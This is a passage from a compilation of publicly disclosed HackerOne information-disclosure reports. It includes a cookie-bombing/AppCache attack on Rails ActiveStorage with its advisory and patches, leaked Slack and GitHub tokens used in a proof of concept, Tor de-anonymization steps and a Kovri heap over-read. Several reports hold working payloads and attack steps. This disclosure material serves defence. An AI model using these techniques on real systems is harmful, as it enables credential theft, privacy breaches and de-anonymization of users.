Any requests to this bucket will be hijacked.
<script>
setTimeout(function(){
for(var i = 1e3; i>0; i--){document.cookie = i + '=' + Array(4e3).join('0') + '; path=/'};
}, 3000);
</script>
</html>
```
Grab the service URL for `main.html`, modify content type and disposition to ensure it's served as `inline` and `text/html`, and trick a user of the Rails app with access to `ActiveStorage` attachments into clicking it.

Since it'll be open inline and as HTML, the JS code to overflow the cookies for the service (storage.googleapis.com in the case of GCS) will be executed. Next time the user makes a request for a file under the same bucket as `main.html`, googleapis.com will return an error due to the size of the cookie headers. This will be interpreted as being offline by the browser, which will offer the fallback specified in the manifest.  The `fallback.html` above will be opened inline and as HTML as well, and its JS code executed. That code can be made to send `location.href` (the signed URL)  to the attacker.

## Impact

Gain access to signed URLs for private objects, which in practice means access to those objects, as signed URLs is all that is needed.

**Summary (team):**

# Bypass vulnerability in Active Storage

There is a vulnerability in Active Storage. This vulnerability has been
assigned the CVE identifier CVE-2018-16477.

Versions Affected:  >= 5.2.0
Not affected:       < 5.2.0
Fixed Versions:     5.2.1.1

Impact
------
Signed download URLs generated by `ActiveStorage` for Google Cloud Storage
service and Disk service include `content-disposition` and `content-type`
parameters that an attacker can modify. This can be used to upload specially
crafted HTML files and have them served and executed inline. Combined with
other techniques such as cookie bombing and specially crafted AppCache manifests,
an attacker can gain access to private signed URLs within a specific storage path.

Vulnerable apps are those using either GCS or the Disk service in production.
Other storage services such as S3 or Azure aren't affected.

All users running an affected release should either upgrade or use one of the
workarounds immediately. For those using GCS, it's also recommended to run the
following to update existing blobs:

```
ActiveStorage::Blob.find_each do |blob|
  blob.send :update_service_metadata
end
```

Releases
--------
The FIXED releases are available at the normal locations.

Workarounds
-----------
Putting the following monkey patches in an intializer can help to mitigate the issue:

For GCS service:
```
require 'active_storage'
require 'active_storage/service/gcs_service'

module ActiveStorage
  module GCSMetadata
    def upload(key, io, checksum: nil, content_type: nil, disposition: nil, filename: nil)
      instrument :upload, key: key, checksum: checksum do
        begin
          content_disposition = content_disposition_with(type: disposition, filename: filename) if disposition && filename
          bucket.create_file(io, key, md5: checksum, content_type: content_type, content_disposition: content_disposition)
        rescue Google::Cloud::InvalidArgumentError
          raise ActiveStorage::IntegrityError
        end
      end
    end

    def update_metadata(key, content_type:, disposition: nil, filename: nil)
      instrument :update_metadata, key: key, content_type: content_type, disposition: disposition do
        file_for(key).update do |file|
          file.content_type = content_type
          if disposition && filename
            file.content_disposition = content_disposition_with(type: disposition, filename: filename)
          end
        end
      end
    end
  end

  module StoreMetadata
    def upload_without_unfurling(io)
      service.upload key, io, checksum: checksum, **service_metadata
    end

    def identify
      unless identified?
        update! content_type: identify_content_type, identified: true
        update_service_metadata
      end
    end

    private
      def service_metadata
        if forcibly_serve_as_binary?
          { content_type: "application/octet-stream", disposition: :attachment, filename: filename }
        else
          { content_type: content_type }
        end
      end

      def update_service_metadata
        service.update_metadata key, service_metadata if service_metadata.any?
      end
  end
end

Rails.application.config.to_prepare do
  ActiveStorage::Service::GCSService.prepend ActiveStorage::GCSMetadata
  ActiveStorage::Blob.prepend ActiveStorage::StoreMetadata
end
```

For Disk service:
```
require 'active_storage'
require 'active_storage/service/disk_service'

module ActiveStorage
  module GetParamsFromKey
    def show
      if key = decode_verified_key
        serve_file disk_service.path_for(key[:key]), content_type: key[:content_type], disposition: key[:disposition]
      else
        super
      end
    rescue Errno::ENOENT
      head :not_found
    end
  end

  module IncludeParamsInKey
    def upload(key, io, checksum: nil, **)
      super(key, io, checksum: checksum)
    end

    def update_metadata(key, **)
    end

    def url(key, expires_in:, filename:, disposition:, content_type:)
      instrument :url, key: key do |payload|
        content_disposition = content_disposition_with(type: disposition, filename: filename)
        verified_key_with_expiration = ActiveStorage.verifier.generate(
          {
            key: key,
            disposition: content_disposition,
            content_type: content_type
          },
          { expires_in: expires_in,
          purpose: :blob_key }
        )

        generated_url = url_helpers.rails_disk_service_url(verified_key_with_expiration,
          host: current_host,
          disposition: content_disposition,
          content_type: content_type,
          filename: filename
        )
        payload[:url] = generated_url

        generated_url
      end
    end
  end
end

Rails.application.config.to_prepare do
  ActiveStorage::DiskController.prepend ActiveStorage::GetParamsFromKey
  ActiveStorage::Service::DiskService.prepend ActiveStorage::IncludeParamsInKey
end
```

---

### [[avito.ru] Утекают креды от платежных провайдеров](https://hackerone.com/reports/271360)

- **Report ID:** `271360`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** Avito
- **Reporter:** @kxyry
- **Bounty:** - usd
- **Disclosed:** 2018-12-24T15:38:17.513Z
- **CVE(s):** -

**Summary (team):**

Происходила утечка реквизитов от внешних систем в исходном коде страницы сайта.

---

### [Exploiting Misconfigured CORS to Steal User Information](https://hackerone.com/reports/317391)

- **Report ID:** `317391`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Rockstar Games
- **Reporter:** @1hack0
- **Bounty:** 500 usd
- **Disclosed:** 2018-10-17T15:04:05.195Z
- **CVE(s):** -

**Summary (team):**

In this report, the researcher demonstrated how a CORS misconfiguration was allowing user details, such as email addresses and IDs, to be shared inappropriately. They also provided a POC which showed how an attacker could exploit this remotely. This issue was resolved in a platform update to our Support site; the gateway that was leaking user information was removed entirely.

---

### [Compromising the user ID](https://hackerone.com/reports/358007)

- **Report ID:** `358007`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Bumble
- **Reporter:** @jarvis0x1
- **Bounty:** - usd
- **Disclosed:** 2018-10-07T00:51:49.026Z
- **CVE(s):** -

**Vulnerability Information:**

Vulnerability allows to compromise the user ID in the "Dating" menu. This is a serious vulnerability that violates the logic of the site and allows the attacker to write a message to the user he likes before the user responds reciprocally.

In order to play the vulnerability, you need to go to the page [Dating](https://badoo.com/encounters), and use all available ones for the current account. While the husky is not over, such a request is sent:

{F302185}

In response comes this:

{F302186}

So far, nothing interesting in the answer. Next, you need to use all available hounds. If you need to do this quickly, you can press the "1" key quickly on the keyboard. When the husky is over, such a window will be displayed.

 {F302183}

We need to close this window. Next, the implementation of the vulnerability on the real profile will be demonstrated. The following profile is displayed:

{F302198}

You must press the "1" key. Then look in Burp Suite which request was sent:

{F302197}

Here is the answer:

{F302201}

The response comes with a link:

`pr4eu.badoocdn.com/p34/133/0/0/5/631317204/d1341450/t1527356459/c_JfzIrrpMHtw3mgp4-aHsvV7EuPiN5pF-uR22VRsu9Zc/1341450309/dfs_180x180/sz___size__.jpg`

In the link you can find ID: 631317204

Then just go to the link

`https://badoo.com/profile/631301611` 

And the real profile of the girl will be received.

{F302205}

You can write her a message.

This vulnerability can be automated. To do this, you need to get a "Premium", you can use a free two-day version. You need to go to the [Settings] page (https://badoo.com/settings) and delete your profile. When deleting, several windows will be highlighted, one of which will offer Premium for 2 days. Premium status allows you to change "like" to "dislay" and vice versa. Next, you need to return to[Знакомства](https://badoo.com/encounters) and click on the cross. When the next page appears, you can decide whether you like the profile of a person or not. If you like - click on "Laik", look at the query response, identify the ID, then click on the cross on the page, going to the next profile. Then go to this person's page by ID, change the "dislay" to "like" and then write a private message.


This method can be automated programmatically through python + selenium, pumping out pictures of avatars of girls in the folder, giving them names in the form {ID} .png. This will quickly select the girls you like and write them.

## Impact

The attacker can scroll the profiles of users in the "Dating" menu and determine the ID of a particular user who he liked. Knowing ID, you can write to the user, without waiting until he responds with the interaction.

---

### [Leaking sensitive information on Github lead full access to all Grab Slack channels ](https://hackerone.com/reports/397527)

- **Report ID:** `397527`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** Grab
- **Reporter:** @xsam
- **Bounty:** - usd
- **Disclosed:** 2018-09-11T08:00:13.996Z
- **CVE(s):** -

**Vulnerability Information:**

#Summary:

 Accidental leakage of secret keys in such code repositories is a real problem, after my report #387117, I decided to dig deeper than the previous report and looking to some random profiles in Github, and doing some dirty work I was able to access to the developer’s company’s internal chats and files on Slack. And not only that, there’s no easy way to see if someone is eavesdropping on the communication. In the worst case scenario, these chats can leak production database credentials, source code, files with passwords and highly sensitive information.

#Description:

__████__ is QA Automation Engineer at Grab according to his [LinkedIn profile](https://www.linkedin.com/in/██████████/), after doing some manual search in Github. I found his Github profile which contains weird repo

https://github.com/████/

{F335908}

I was about to close that tab since there is no useful file but wait second, did you notice __30 releases__?

Multiple versions for multiple OS systems, I decided to download [the zip file](https://github.com/████████/releases/download/v1.0.34/vnot-automation-support-1.0.34-mac.zip), after the unzipping I started __███__ which is an Electron application.

{F335910}

I thought it was a dead-end but I noticed the bar so I clicked `Environment` then `Toggle Developer tools` in order to know the origin of that app go to `Source` as attached in the screenshot below 

{F335916}

Know it is the time for some thinking outside of the box and be creative. As I don't have much experience with Electron apps so after some googling I found that it is possible to reverse-engineer an existing Electron app by following [those steps](https://medium.com/how-to-electron/how-to-get-source-code-of-any-electron-application-cbb5c7726c37) :

* Open terminal and install asar node module globally by typing __`npm install -g asar`__

* Go to __████__ file directory, in my case
 __`cd /Users/mac/Downloads/██████/Contents/Resources`__

* Create a directory to paste the content of app for example __`mkdir ███████-sourcecode`__

* Unpack the app.asar file in the above directory using asar __`asar extract app.asar example-sourcecode`__

{F335918}

Now we have all available endpoints in the app or let say in `gamma.grab.com` as well if you go to 
`build/constants/google/` you will get client_secret.json

```
{
    "installed": {
        "client_id": "█████",
        "project_id": "███████",
        "auth_uri": "https://accounts.google.com/o/oauth2/auth",
        "token_uri": "https://accounts.google.com/o/oauth2/token",
        "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
        "client_secret": "█████████",
        "redirect_uris": ["urn:ietf:wg:oauth:2.0:oob", "http://localhost"]
    }
}
```

and google_token.json

```
{"access_token":"██████████","refresh_token":"████","token_type":"Bearer","expiry_date":█████████}
```

But the most usefull and impactfull files are on `build/environement`:
* production-ph.env.json
* production.env.json
* staging.env.json

to verify if those token work let take for example 

```
"slack": {
    "channel": "█████",
    "schedule_channel": "███████",
    "token":
      "xoxp-██████",
    "user": "█████ ██████████"
  }
```

Before doing we need to know what kind of token is on our hand since [Slack have multiple kinds of token](https://api.slack.com/docs/token-types)

{F335920}

{F335921}

So we have __`User tokens`__ The xoxp-token (prefix xoxp) can be generated from the OAuth Test Token-page. This token is exactly like having the complete username and password for the user. Even for a user with two-factor authentication enabled, you can still access Slack with nothing else but this token.
And it is time to test if that token work or not? in order to that we need to follow the API documentation provided by slack here https://api.slack.com/web and try a non-sensitive method since I don't have the permission to read your internal data 

{F335923} 

The best example will be to list the name of all channels

{F335924}

So I set GET request in Burp with adding `Authorization: Bearer xoxp-████`as header and the result 

{F335925}

The result is 100 channels including but not limited to : 

* ██████
* ████
* ███████
*█████

#How to protect? (Important)

* __Avoid git add: commands:__ Using wildcards can easily capture local files not truly intended to be shared, Instead of wildcards, name each file you commit, or use git add -p to review each change you add.

* __Name sensitive files in .gitignore & .npmignore:__ git support a local file listing exclusions from packaging and commits, which you can use as a safety measure against the accidental inclusion of sensitive files, and you can use GitHub’s sample .gitignore files for other inspiration.

* __git-secrets: git hook prevents committing in credentials:__ a useful tool called git-secrets. The tool hooks onto git commit and breaks the commit if it includes patterns that appear to be credential. This is a good content-focused safety net, complementing the previously suggested filename based protection.

* __Encrypt or use environment vars when publishing from CI.__

* __Invalidate leaked credentials.__

#Reference:

* https://labs.detectify.com/2016/04/28/slack-bot-token-leakage-exposing-business-critical-information/
* https://medium.com/how-to-electron/how-to-get-source-code-of-any-electron-application-cbb5c7726c37
* https://api.slack.com/docs/token-types

## Impact

As I mentioned in the summary it possible to access to the developer’s company’s internal chats and files on Slack. And not only that, there’s no easy way to see if someone is eavesdropping on the communication and there are more worst scenarios.

**Summary (team):**

The researcher @xsam reported leakage of two access tokens, one belonging to Slack and the other belonging to Google API’s. Researcher identified a public github repository with no source code but an electron package app in releases, interestingly he went on to downloaded the package and reverse engineer the electron app which lead him to identify the access tokens.

Within few minutes of receiving the report, the bug report was triaged and validated, access tokens were revoked and public repository was removed. Any valid HackerOne bug report submission triggers an internal incident investigation. In this case, a thorough investigation was conducted to identify any prior abuse and overall impact. Investigation concluded that these tokens weren't abused in the past.

We appreciate @xsam's contribution to our bug bounty program, @xsam displayed creative thinking and submitted detailed report which allowed us to quickly reproduce and validate the submission. We look forward to see more of his creative bug reports to our program.

---

### [Stealing Private Information in VK Android App through PlayerProxy Port Remotely](https://hackerone.com/reports/292761)

- **Report ID:** `292761`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** VK.com
- **Reporter:** @heeeeen
- **Bounty:** 700 usd
- **Disclosed:** 2018-09-02T14:04:39.977Z
- **CVE(s):** -

**Summary (team):**

Incorrect interaction with the network.

---

### [Доступ к администраторским faq ](https://hackerone.com/reports/370629)

- **Report ID:** `370629`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** VK.com
- **Reporter:** @executor
- **Bounty:** 500 usd
- **Disclosed:** 2018-09-02T13:50:47.326Z
- **CVE(s):** -

**Summary (team):**

Просмотр некоторых закрытых статей FAQ.

**Summary (researcher):**

Уязвимость позволяла получить доступ к талмудам (vk.com/tlmdXXX)  в которых хранится информация для администраторов и модераторов социальной сети ВКонтакте...

Получение доступа к адм. информации...
@
500$

---

### [Information Leak - Github - JMS Information](https://hackerone.com/reports/360811)

- **Report ID:** `360811`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Starbucks
- **Reporter:** @p3t3r_r4bb1t
- **Bounty:** - usd
- **Disclosed:** 2018-08-16T20:12:51.016Z
- **CVE(s):** -

**Vulnerability Information:**

Hi,

After some research, I found a leak on GitHub that might lead to accessing sensitive data of employees or clients (not sure based on the code). There is also a SAP S-user to access a cloud based HANA service. I have not confirmed what kind of data is in there to avoid potential legal issues. I will let you guys figure that out ;)

I am not sure who is the owner of the repository, but I can tell you that the SAP credentials are for someone at Starbucks China.

https://github.com/karaskay/personalware

Some interesting files:
https://github.com/karaskay/personalware/blob/989723f896eec67a50a9b9f59ceefc48a046049b/python/PycharmProjects/JMS36/testhttprequestjson.py
(SAP Cloud HANA credentials)

https://github.com/karaskay/personalware/blob/989723f896eec67a50a9b9f59ceefc48a046049b/python/PycharmProjects/JMS36/JMSproducerforsurvey.py
(starbuckstest domain credentials)

Thanks!

## Impact

High potential of an unauthorized access to PII data

---

### [GitHub API Key for BrewTestBot is publicly exposed](https://hackerone.com/reports/388740)

- **Report ID:** `388740`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** Homebrew
- **Reporter:** @ejholmes
- **Bounty:** - usd
- **Disclosed:** 2018-08-11T13:57:57.996Z
- **CVE(s):** -

**Vulnerability Information:**

Hello!

While browsing through some old reports, I found that https://jenkins.brew.sh was publicly accessible. I got curious when I saw one of the [brew bottle builds](https://jenkins.brew.sh/job/Homebrew%20Bottles/33255/console) doing a `git push` to BrewTestBot/homebrew-core, and wondered if the credentials to make authenticated pushes were accessible.

Sure enough, you can view environment variables for the build on [this page](https://jenkins.brew.sh/job/Homebrew%20Bottles/33255/injectedEnvVars/), which includes a `HOMEBREW_GITHUB_API_TOKEN` environment variable.

This API token belongs to the [BrewTestBot](https://github.com/BrewTestBot) user on GitHub, and this API key allows me to commit to the `BrewTestBot/homebrew-core` repository:

```
$ export GITHUB_API_TOKEN=<github token from above>
$ curl https://api.github.com/repos/BrewTestBot/homebrew-core/git/blobs -u $GITHUB_API_TOKEN:x-oauth-basic -d '{"content":"test"}' -H "Content-Type: application/json"
{
  "sha": "30d74d258442c7c65512eafab474568dd706c430",
  "url": "https://api.github.com/repos/BrewTestBot/homebrew-core/git/blobs/30d74d258442c7c65512eafab474568dd706c430"
}
```

## Impact

Based on the purpose of `BrewTestBot`, this might be entirely intended, but if the GitHub access token has overly permissive scopes, it might be usable to perform other actions, aside from a `git push`. In that case, an SSH deploy key may be better, and less permissive.

If exposing this API key publicly is intended behavior, please feel free to close this.

---

### [De-anonymization by visiting specially crafted bookmark.](https://hackerone.com/reports/294364)

- **Report ID:** `294364`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Tor
- **Reporter:** @qab
- **Bounty:** - usd
- **Disclosed:** 2018-07-03T04:35:59.675Z
- **CVE(s):** -

**Vulnerability Information:**

There is a way to import logs in 'about:memory' from local disk, however, (tested on windows) you can pass a network url that may point to attack controlled server which logs IP's. This connection is done by windows (presumably) and so doesn't hide real IP of Tor user.

1. Have victim drag and drop an anchor tag pointing to 'about:memory?file=\\localhost\\q.json.gz' inside bookmarks bar.
2. Victim then clicks on bookmark to visit URL.
3. An unproxied connection is made to 'localhost'

## Impact

De-anonymization. If coupled with a bug to open privileged pages (which about:memory is) one could theoretically achieve a very dangerous exploit to expose real ips of victims.

---

### [Просмотр любых записей на стене](https://hackerone.com/reports/341675)

- **Report ID:** `341675`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** VK.com
- **Reporter:** @trainzment
- **Bounty:** 700 usd
- **Disclosed:** 2018-06-18T00:14:32.493Z
- **CVE(s):** -

**Summary (team):**

Отсутствие необходимых проверок при создании рекламного объявления.

**Summary (researcher):**

Можно было смотреть записи любых частных и закрытых групп, удаленные записи в группах или профилях, записи на удаленных страницах, заблокированные группы, посты в предложке.

---

### [Leaking sensitive files on Github leads to internal files (python scripts,SQL files)](https://hackerone.com/reports/301831)

- **Report ID:** `301831`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** Starbucks
- **Reporter:** @xsam
- **Bounty:** - usd
- **Disclosed:** 2018-05-17T21:19:10.828Z
- **CVE(s):** -

**Summary (team):**

@samidrif discovered a source repository containing sensitive and internal development information including Starbucks code and documentation.  @samidrif delivered a quality report detailing his find, suspected impact, and suggestions for remediation.  The repository was removed and necessary remediations performed quickly, however the ticket remained open while we completed additional work.  Thank you @samidrif for the solid research!

---

### [Смотрим фотографии из частных/закрытых групп.](https://hackerone.com/reports/321594)

- **Report ID:** `321594`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** VK.com
- **Reporter:** @executor
- **Bounty:** 500 usd
- **Disclosed:** 2018-04-26T05:24:27.724Z
- **CVE(s):** -

**Summary (team):**

Просмотр закрытых фотографий.

**Summary (researcher):**

Жестки хак на просмотр любых фоток из любых груп + возможность их лаека и получения хеша для любого пользователя.......

---

### [SSRF+XSS](https://hackerone.com/reports/326043)

- **Report ID:** `326043`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** U.S. Dept Of Defense
- **Reporter:** @alyssa_herrera
- **Bounty:** - usd
- **Disclosed:** 2018-04-17T18:13:00.850Z
- **CVE(s):** -

**Summary (researcher):**

I discovered that due to an outdated Jira instance, I was able to exploit an SSRF vulnerability in Jira and was able to perform several actions such as bypass any firewall/protection solutions, access AWS instance data, access Internal DoD Servers and internal services. Additionally I was able to perform XSPA through assessing the response times for ports.

I discuss the vulnerabilities exploited in my write which you can find here, https://medium.com/bugbountywriteup/piercing-the-veil-server-side-request-forgery-to-niprnet-access-c358fd5e249a

---

### [Information Disclosure](https://hackerone.com/reports/330860)

- **Report ID:** `330860`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** U.S. Dept Of Defense
- **Reporter:** @alyssa_herrera
- **Bounty:** - usd
- **Disclosed:** 2018-04-17T18:08:02.847Z
- **CVE(s):** CVE-2017-9506

**Summary (researcher):**

I discovered that due to an outdated atlassian software instance, I was able to exploit an SSRF vulnerability in confluence and was able to perform several actions such as bypass any firewall/protection solutions, was able to perform XSPA through assessing the response times for ports, access Internal DoD Servers and internal services.

I discuss the vulnerabilities exploited in my write which you can find here, https://medium.com/bugbountywriteup/piercing-the-veil-server-side-request-forgery-to-niprnet-access-c358fd5e249a

---

### [[http://www.informatica.com]- info disclosure](https://hackerone.com/reports/311058)

- **Report ID:** `311058`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** Informatica
- **Reporter:** @modam3r5
- **Bounty:** - usd
- **Disclosed:** 2018-02-26T05:03:00.233Z
- **CVE(s):** -

**Summary (team):**

Researcher has identified and reported an sensitive information leakage in one of our domain. He helped us in resolving the issue.

---

### [Backup Source Code Detected](https://hackerone.com/reports/309537)

- **Report ID:** `309537`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** VK.com
- **Reporter:** @linkks
- **Bounty:** - usd
- **Disclosed:** 2018-02-24T19:02:08.776Z
- **CVE(s):** -

**Summary (team):**

Старый сборщик логов.

**Summary (researcher):**

Старый сборщик логов.

Который я увидел а также получил доступ к бд  !

---

### [Opcode Cache](https://hackerone.com/reports/308355)

- **Report ID:** `308355`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** VK.com
- **Reporter:** @linkks
- **Bounty:** - usd
- **Disclosed:** 2018-02-22T21:49:39.700Z
- **CVE(s):** -

**Summary (team):**

Раскрытие имен некоторых файлов.

---

### [Unauthenticated LFI revealing log information](https://hackerone.com/reports/272578)

- **Report ID:** `272578`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Slack
- **Reporter:** @juji
- **Bounty:** - usd
- **Disclosed:** 2018-01-26T01:29:17.618Z
- **CVE(s):** -

**Summary (team):**

@juji found a bug which allowed the disclosure of local files on certain servers - this included PHP files and logs. We performed a thorough investigation to ensure that this issue was not exploited, and as a precaution revoked tokens which were inadvertently logged. Thanks @juji!

**Summary (researcher):**

Write-up incoming... Stay tuned on Twitter!

---

### [Information Disclosure and Privilege Escalation in app.goodhire.com/member/developers/api-settings](https://hackerone.com/reports/276976)

- **Report ID:** `276976`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Inflection
- **Reporter:** @hackedbrain
- **Bounty:** - usd
- **Disclosed:** 2018-01-18T20:20:29.345Z
- **CVE(s):** -

**Summary (team):**

Researcher reported a missing authorization check when purchasing a report. As a result, any valid user with ordering privileges could place an order on behalf of any other account (although would not be able to receive the results of the order). We added an authorization check to ensure that users can only place orders for their own account.

---

### [Development configuration file](https://hackerone.com/reports/231267)

- **Report ID:** `231267`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** Pushwoosh
- **Reporter:** @protector47
- **Bounty:** - usd
- **Disclosed:** 2018-01-18T10:18:17.634Z
- **CVE(s):** -

**Vulnerability Information:**

Hello,
I found an **Sensitive Information Disclosure**.
A configuration file (e.g. Vagrantfile, Gemfile, Rakefile, ...) was found in this directory. This file may expose sensitive information that could help a malicious user to prepare more advanced attacks. It's recommended to remove or restrict access to this type of files from production systems.

#POC
https://go.pushwoosh.com/composer.json
https://go.pushwoosh.com/composer.lock

Open these URLs a configuration file will become download and these files contains very sensitive data.

###IMPACT:
These files may disclose sensitive information. This information can be used to launch further attacks.

###PATCH
Remove or restrict access to all configuration files accessible from internet.

Thanks,

---

### [Uninitialized server memory disclosure via ImageMagick gif parser](https://hackerone.com/reports/284155)

- **Report ID:** `284155`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Mavenlink
- **Reporter:** @chaosbolt
- **Bounty:** - usd
- **Disclosed:** 2017-12-30T13:15:30.222Z
- **CVE(s):** -

**Summary (team):**

A CVE in ImageMagick allowed an attacker to recover random server memory via GIF upload. GIF processing has since been disabled.

---

### [Kovri: potential buffer over-read in garlic clove handling + I2NP message creation](https://hackerone.com/reports/291489)

- **Report ID:** `291489`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Monero
- **Reporter:** @aerodudrizzt
- **Bounty:** - usd
- **Disclosed:** 2017-12-05T06:09:37.460Z
- **CVE(s):** -

**Vulnerability Information:**

Brief
-----
There is a lack of sanitation checks when handling Garlic messages in the kovri I2P router. Sending a specially crafted Garlic message can cause the router to send onward an I2P message containing leaked RAM data, triggering a massive information leakage.

Technical Details:
===========
* Code Version: Taken from Github on the 18th of November 2017 - commit 5aafe6608519d31e537c97b24ea7b23aa372dd5b
* Vulnerable File: src\core\router\garlic.h
* Vulnerable Function: GarlicDestination::HandleGarlicPayload

The function is responsible to parse and handle Garlic Payloads: several independent Garlic Cloves.
When handling a clove with a delivery type of "DeliveryTypeTunnel" there are insufficient checks on the message, before it is wrapped and sent onward:
```cpp
    GarlicDeliveryType delivery_type = (GarlicDeliveryType)((flag >> 5) & 0x03);
    switch (delivery_type) {
      case eGarlicDeliveryTypeLocal:
        LOG(debug) << "GarlicDestination: Garlic type local";
        HandleI2NPMessage(buf, len, from);
      break;
      case eGarlicDeliveryTypeDestination:
        LOG(debug) << "GarlicDestination: Garlic type destination";
        buf += 32;  // destination. check it later or for multiple destinations
        HandleI2NPMessage(buf, len, from);
      break;
      case eGarlicDeliveryTypeTunnel: {
        LOG(debug) << "GarlicDestination: Garlic type tunnel";
        // gateway_hash and gateway_tunnel sequence is reverted
        std::uint8_t* gateway_hash = buf;
        buf += 32;
        std::uint32_t gateway_tunnel = bufbe32toh(buf);
        buf += 4;
        std::shared_ptr<kovri::core::OutboundTunnel> tunnel;
        if (from && from->GetTunnelPool())
          tunnel = from->GetTunnelPool()->GetNextOutboundTunnel();
        // EI [BUG-TRACE] : The payload length is based on an unchecked length field
        // EI             : from the just found I2NP message contained in the clove.
        // EI	          : When creating and sending this message onward we may leak
        // EI             : heap memory data to the destination node [18/11/2017]
        if (tunnel) {  // we have send it through an outbound tunnel
          auto msg = CreateI2NPMessage(buf, kovri::core::GetI2NPMessageLength(buf), from);
          tunnel->SendTunnelDataMsg(gateway_hash, gateway_tunnel, msg);
        } else {
          LOG(debug)
            << "GarlicDestination: no outbound tunnels available for garlic clove";
        }
        break;
      }
      case eGarlicDeliveryTypeRouter:
        LOG(warning) << "GarlicDestination: Garlic type router not supported";
        buf += 32;
      break;
      default:
        LOG(error)
          << "GarlicDestination: unknown garlic delivery type "
          << static_cast<int>(delivery_type);
    }
    buf += kovri::core::GetI2NPMessageLength(buf);  // I2NP
    buf += 4;  // CloveID
    buf += 8;  // Date
    buf += 3;  // Certificate
    // EI [BUG_TRACE] : This check is too late since the I2NP message was already sent. [18/11/2017]
    if (buf - buf1  > static_cast<int>(len)) {
      LOG(error) << "GarlicDestination: clove is too long";
      break;
    }
```

Proposed Fix
---------------
The inner I2NP message is parsed and forwarded using it's own length field BEFORE this field is checked for consistency. There is a good sanitation check in the bottom of the function, but the check is preformed only AFTER the message is sent.

The proposed fix is to copy the current code check to the vulnerable case, and to preform it before the new message is created:
```cpp
    case eGarlicDeliveryTypeTunnel: {
        LOG(debug) << "GarlicDestination: Garlic type tunnel";
        // gateway_hash and gateway_tunnel sequence is reverted
        std::uint8_t* gateway_hash = buf;
        buf += 32;
        std::uint32_t gateway_tunnel = bufbe32toh(buf);
        buf += 4;
        std::shared_ptr<kovri::core::OutboundTunnel> tunnel;
        if (from && from->GetTunnelPool())
          tunnel = from->GetTunnelPool()->GetNextOutboundTunnel();
        // EI [BUG-FIX] : added this new check
        if (buf + kovri::core::GetI2NPMessageLength(buf) + 4 + 8 + 3 - buf1  > static_cast<int>(len)) {
          LOG(error) << "GarlicDestination: clove is too long";
          break;
        }
        if (tunnel) {  // we have send it through an outbound tunnel
          auto msg = CreateI2NPMessage(buf, kovri::core::GetI2NPMessageLength(buf), from);
          tunnel->SendTunnelDataMsg(gateway_hash, gateway_tunnel, msg);
        } else {
          LOG(debug)
            << "GarlicDestination: no outbound tunnels available for garlic clove";
        }
        break;
      }
```

Implications
--------------
Since the original message is allocated on the heap, this message can **leak massive amounts of heap data** to the receiving node (message lengths can be even 32KB). This data contains previous messages, currently treated messages, and many other sensitive data-structures of the I2P router.

In case there are any questions regarding my findings I will be more than happy to help.

---

### [Access Grab_Road BigData Database via Open Presto coordinator](https://hackerone.com/reports/266766)

- **Report ID:** `266766`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** Grab
- **Reporter:** @vinothkumar
- **Bounty:** 5000 usd
- **Disclosed:** 2017-11-30T03:54:22.809Z
- **CVE(s):** -

**Summary (team):**

A publicly accessible analytics database instance was identified, due to a firewall misconfiguration.

The instance contained booking related information but did not contained any passenger or driver personal information. This vulnerability was discovered using Shodan search engine by **Vinoth Kumar**. Grab security team quickly resolved the issue and awarded the researcher based on the impact. 

Once again we would like to thanks @vinothkumar. It was a pleasure to work with and we look forward to see more of his reports in the future.

---

### [Linux TBB SFTP URI allows local IP disclosure](https://hackerone.com/reports/253429)

- **Report ID:** `253429`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** Tor
- **Reporter:** @rethink5807
- **Bounty:** 3000 usd
- **Disclosed:** 2017-10-25T21:58:22.196Z
- **CVE(s):** -

**Vulnerability Information:**

Browsing to a simple URL to an sftp URI allows bypasses socks proxy for DNS and browsing.
Tested on a clean install of Ubuntu 16.04 with TBB 7.0.2 (4097d43aa0be86ae3fe43ec8f3ac5394) download from https://www.torproject.org/dist/torbrowser/7.0.2/tor-browser-linux64-7.0.2_en-US.tar.xz
 
POC:
Navigate to sftp://104.131.180.179:80/index.php

After ~1 minute check http://104.131.180.179/ip,txt for your IP address

It appears that ubuntu's default SSH client is associated with this URI which causes the client to attempt the connection on behalf of the user. The windows TBB does not appear to be affected. 

Excerpt from apache logs:
apache2: [core:error] [pid 10671] [client x.x.x.x:40063] AH00126: Invalid URI in request SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.1

Not surprisingly, the client can also be directed to local resources as well.

---

### [Disclosure of sensitive information through Google Cloud Storage bucket](https://hackerone.com/reports/176013)

- **Report ID:** `176013`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Vimeo
- **Reporter:** @koenrh
- **Bounty:** - usd
- **Disclosed:** 2017-09-29T17:40:27.156Z
- **CVE(s):** -

**Summary (team):**

An insecure bucket was discovered on the GCP platform that had some debug information in it.  Steps were taken to secure the bucket and it's contents.

---

### [Open prod Jenkins instance](https://hackerone.com/reports/231460)

- **Report ID:** `231460`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Snapchat
- **Reporter:** @preben
